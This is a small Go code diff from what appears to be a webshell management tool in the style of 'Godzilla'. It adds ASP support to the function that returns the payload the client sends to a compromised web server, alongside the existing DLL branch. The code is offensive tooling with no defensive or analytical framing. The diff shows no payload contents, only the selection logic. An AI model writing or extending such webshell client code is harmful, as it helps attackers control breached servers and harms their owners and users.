@@ -57,6 +57,10 @@ func (g *GodzillaInfo) GetPayload() []byte {
 		data := payloads.GodDllFiles
 		//return g.dynamicUpdateClassName("payload", data)
 		return data
+	} else if g.Script == shell.AspScript {
+		data := payloads.GodAspFiles
+		//return g.dynamicUpdateClassName("payload", data)
+		return data
 	} else {
 		return nil
 	}
